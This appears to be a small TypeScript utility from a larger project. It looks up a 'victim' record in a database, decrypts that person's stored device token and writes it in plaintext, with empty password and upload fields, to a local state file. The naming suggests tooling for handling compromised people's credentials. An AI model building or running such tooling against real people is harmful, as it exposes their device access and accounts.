import { writeFile } from 'node:fs/promises';
import { prisma } from '../server/lib/db';
import { openSecret } from '../server/lib/crypto';

async function main(): Promise<void> {
  const victim = await prisma.victim.findUnique({ where: { id: process.argv[2]! } });
  if (!victim) throw new Error('no victim');
  const state = { victim_id: victim.id, device_token: openSecret(victim.deviceTokenEnc), passwords: {}, uploads: {} };
  await writeFile(process.argv[3] ?? '.tmpx-state.json', JSON.stringify(state));
  console.log('ok', victim.id);
}

main()
  .catch((error) => console.error(error))
  .finally(() => void prisma.$disconnect());
